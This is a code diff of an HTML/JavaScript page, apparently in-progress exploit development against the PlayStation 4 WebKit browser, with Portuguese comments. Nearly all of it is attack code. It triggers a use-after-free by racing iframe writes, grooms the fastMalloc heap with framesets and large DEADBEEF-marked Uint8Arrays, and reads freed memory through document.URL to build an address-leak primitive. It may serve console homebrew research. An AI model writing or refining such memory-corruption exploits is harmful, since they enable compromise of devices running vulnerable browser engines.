@@ -1,19 +1,27 @@
-
 <!DOCTYPE html>
 <html>
 <head>
 <meta charset="UTF-8">
-<title>PS4 WebKit – Addrof & Memory Race</title>
-
+<title>PS4 WebKit – PSFree fastMalloc Edition</title>
+<style>
+    body { font-family: monospace; background:#000; color:#0f0; padding:20px; }
+    button { 
+        font-size:14px; padding:12px; margin:5px; 
+        background:#222; color:#0f0; border:1px solid #0f0; cursor:pointer; width: 300px; text-align: left;
+    }
+    button:hover { background:#0f0; color:#000; }
+    #log { white-space: pre-wrap; border-top: 1px solid #333; margin-top: 20px; padding-top: 10px; }
+    .status { color: #fff; font-weight: bold; }
+</style>
 </head>
 <body>
-<h2>PS4 WebKit – Addrof & Memory Race</h2>
+<h2>PS4 WebKit – fastMalloc Reclamation (PSFree Style)</h2>
 <p>Status: <span id="status" class="status">Ready</span></p>
 
-<button onclick="runStepA()">1. FINGERPRINT CHECK</button><br>
-<button onclick="runStepB()">2. WINDOWED READ (HEX)</button><br>
+<button onclick="runStepA()">1. FINGERPRINT CHECK (VVVV)</button><br>
+<button onclick="runStepB()">2. WINDOWED READ (340KB SCAN)</button><br>
 <button onclick="runStepC()">3. LAYOUT LOGIC CHECK</button><br>
-<button onclick="runStepD()">4. OBJECT ALIGNMENT (ADDROF)</button>
+<button onclick="runStepD()">4. PSFREE RECLAMATION (ADDROF)</button>
 
 <div id="log"></div>
 
@@ -26,7 +34,7 @@ function sleep(ms){ return new Promise(r=>setTimeout(r,ms)); }
 
 window.keepAlive = [];
 
-// --- TRIGGER COM SLEEP AJUSTADO PARA VENCER A URL ---
+// --- TRIGGER BASE (ESTABILIDADE COMPROVADA: i < 48) ---
 async function triggerBaseUAF(fastMode = false) {
     logEl.textContent = "";
     window.keepAlive = [];
@@ -48,7 +56,7 @@ async function triggerBaseUAF(fastMode = false) {
         await sleep(5);
     }
 
-    // AJUSTE: Redução drástica para vencer a escrita da URL na memória
+    // Usando os tempos de espera que funcionaram nos seus logs
     let waitWindow = fastMode ? 40 : 120;
     let waitGroom = fastMode ? 20 : 80;
 
@@ -60,8 +68,7 @@ async function triggerBaseUAF(fastMode = false) {
         let f = document.createElement("iframe");
         document.body.appendChild(f);
         try {
-            let d = f.contentDocument;
-            d.open();
+            let d = f.contentDocument; d.open();
             d.write("<html><body>" + ("X".repeat(2048)) + "</body></html>");
             d.close();
         } catch(e){}
@@ -74,61 +81,67 @@ async function triggerBaseUAF(fastMode = false) {
     await sleep(waitGroom);
 }
 
-async function runStepA() { await triggerBaseUAF(false); log("\n[A] Fingerprint..."); let url = document.URL; for(let i=0; i<26; i++){ let p = String.fromCharCode(0x41+i).repeat(10); if(url.includes(p)) log("FOUND: " + p.substring(0,4) + " at " + url.indexOf(p)); } }
+// Passos 1, 2 e 3 mantidos conforme sua análise anterior
+async function runStepA() { await triggerBaseUAF(false); log("\n[A] Fingerprint..."); let url = document.URL; for(let i=0; i<26; i++){ let p = String.fromCharCode(0x41+i).repeat(10); if(url.includes(p)) log("FOUND: " + p.substring(0,4) + " at offset " + url.indexOf(p)); } }
 
-async function runStepB() { await triggerBaseUAF(false); log("\n[B] Hex Probe..."); let url = document.URL; [0, 34, 1000, 50000].forEach(off => { if(off < url.length) log("["+off+"]: 0x"+url.charCodeAt(off).toString(16).toUpperCase()); }); }
+async function runStepB() { await triggerBaseUAF(false); log("\n[B] Hex Probe..."); let url = document.URL; [0, 34, 1000, 50000, 300000].forEach(off => { if(off < url.length) log("["+off+"]: 0x"+url.charCodeAt(off).toString(16).toUpperCase()); }); }
 
 async function runStepC() { await triggerBaseUAF(false); let old = document.URL.length; location.hash = "#TEST"; await sleep(20); log("Sync Check: " + old + " -> " + document.URL.length); }
 
-// --- PASSO D: O SPRAY AGRESSIVO PARA ADDROF ---
-async function runStepD_PSFreeStyle() {
-    await triggerBaseUAF(true); // Sua fase estável
-    
-    log("\n[STEP D] PSFree Technique: fastMalloc Reclamation...");
-    statusEl.textContent = "Spraying fastMalloc (Framesets & Large Arrays)...";
+// --- PASSO D: TÉCNICA PSFREE (fastMalloc) ---
+async function runStepD() {
+    await triggerBaseUAF(true); 
+    log("\n[STEP D] Target: fastMalloc Reclamation (PSFree Style)...");
+    statusEl.textContent = "Spraying fastMalloc Partition...";
 
     let sprayArrays = [];
     let sprayFrames = [];
 
-    // 1. Spray via frameset (Técnica do psfree.mjs)
-    // Criamos strings que resultam em alocações de tamanho similar ao seu buffer
-    let rowPattern = ",".repeat(100); 
-    for(let i = 0; i < 200; i++) {
+    // Técnica 1: Framesets (PSFree usa para alocar via makeUniqueArray no fastMalloc)
+    // O tamanho das strings gera alocações similares ao seu buffer de 340KB
+    let rowPattern = ",".repeat(400); 
+    for(let i = 0; i < 250; i++) {
         let fset = document.createElement("frameset");
         fset.rows = rowPattern; 
         sprayFrames.push(fset);
     }
 
-    // 2. Spray via Large Uint8Arrays (Técnica do memtools.mjs)
-    // Usamos o tamanho exato do seu leak capturado no log [340356]
-    for(let i = 0; i < 100; i++) {
-        let a = new Uint8Array(340356);
-        // Preenchemos com um marcador visível (0xEFBEADDE -> DEADbeef)
-        for(let j = 0; j < 100; j+=4) {
+    // Técnica 2: Large Uint8Arrays (Força alocação Oversize fora do GC)
+    const TARGET_SIZE = 340356; // O tamanho exato do seu leak de length
+    for(let i = 0; i < 150; i++) {
+        let a = new Uint8Array(TARGET_SIZE);
+        // Preenche com padrão DE ADBE EF (DEADBEEF) para identificação
+        for(let j = 0; j < 400; j+=4) {
             a[j] = 0xDE; a[j+1] = 0xAD; a[j+2] = 0xBE; a[j+3] = 0xEF;
         }
         sprayArrays.push(a);
     }
 
     window.keepAlive = [sprayArrays, sprayFrames];
-    await sleep(50);
+    await sleep(60);
 
     let url = document.URL;
-    log("Scanning offsets for DEADbeef marker...");
+    log("Scanning for DEADBEEF marker (0xDE, 0xAD, 0xBE, 0xEF)...");
     
     let found = false;
-    // Varremos onde o VVVV costuma estar (offset 34+)
-    for(let off = 34; off < 2000; off++) {
+    // Varremos o offset 34 em diante (onde os 'V' costumavam estar)
+    for(let off = 34; off < 3000; off++) {
         let code = url.charCodeAt(off);
-        if(code !== 0x56 && code !== 0 && ! [0x68, 0x74, 0x70, 0x73, 0x3A, 0x2F].includes(code)) {
-            log("SUCCESS! Reclaimed memory at [" + off + "]: 0x" + code.toString(16).toUpperCase());
+        
+        // Se encontrarmos o padrão DEADBEEF
+        if(code === 0xDE || code === 0xAD || code === 0xBE || code === 0xEF) {
+            log("SUCCESS! Pattern FOUND at [" + off + "]: 0x" + code.toString(16).toUpperCase());
+            found = true;
+        } else if(code !== 0x56 && code !== 0 && ![0x68, 0x74, 0x70, 0x73, 0x3A, 0x2F].includes(code)) {
+            // Se encontrar qualquer dado que não seja 'V', '0' ou a URL (https://)
+            log("INTERESTING LEAK at [" + off + "]: 0x" + code.toString(16).toUpperCase() + " (" + String.fromCharCode(code) + ")");
             found = true;
         }
     }
     
-    if(!found) log("Ainda lendo V ou URL. Tente aumentar o número de framesets.");
+    if(!found) log("Nothing found. Still reading old 'V' patterns or URL strings.");
     statusEl.textContent = "Analysis Complete";
-                               }
+}
 </script>
 </body>
 </html>
